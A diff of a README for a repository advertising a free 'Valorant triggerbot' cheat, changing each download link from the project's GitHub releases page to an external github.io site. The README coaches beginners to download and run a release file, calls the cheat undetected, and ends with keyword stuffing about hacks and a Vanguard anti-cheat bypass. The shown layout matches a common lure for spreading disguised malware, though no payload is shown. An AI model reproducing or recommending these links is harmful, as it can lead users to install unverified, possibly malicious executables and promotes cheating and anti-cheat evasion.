@@ -1,6 +1,6 @@
 # ⚡ valorant-triggerbot-2026 - Instant Reaction, Humanized Aim
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Triggerbot_2026-blue?style=for-the-badge&logo=github)](https://github.com/dottiefast1090/valorant-triggerbot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Triggerbot_2026-blue?style=for-the-badge&logo=github)](https://dottiefast1090.github.io)
 
 ## 🎯 What Is This?
 
@@ -12,7 +12,7 @@ Welcome! If you're new to this, don't worry. This guide walks you through everyt
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/dottiefast1090/valorant-triggerbot-2026/releases](https://github.com/dottiefast1090/valorant-triggerbot-2026/releases)
+Visit this link to download the application: [https://dottiefast1090.github.io](https://dottiefast1090.github.io)
 
 Once you're on that page, look for the latest release file. Click the download button and save the file to your computer. That's it — the download is simple and straightforward.
 
@@ -117,6 +117,6 @@ This project is provided as-is for educational and entertainment purposes. Use a
 
 **Ready to take your aim to the next level?**
 
-[![Get It Now](https://img.shields.io/badge/Get_It_Now-Download_Here-green?style=for-the-badge)](https://github.com/dottiefast1090/valorant-triggerbot-2026/releases)
+[![Get It Now](https://img.shields.io/badge/Get_It_Now-Download_Here-green?style=for-the-badge)](https://dottiefast1090.github.io)
 
 Keywords: counter-strike, fps-hack, free-valorant-cheat, triggerbot-2026, val-triggerbot-free, valorant-2026, valorant-aimbot, valorant-auto-fire, valorant-auto-shoot-2026, valorant-cheat, valorant-cheat-2026, valorant-crack, valorant-esp, valorant-external, valorant-free, valorant-hack, valorant-trigger, valorant-triggerbot, valorant-undetected, vanguard-bypass
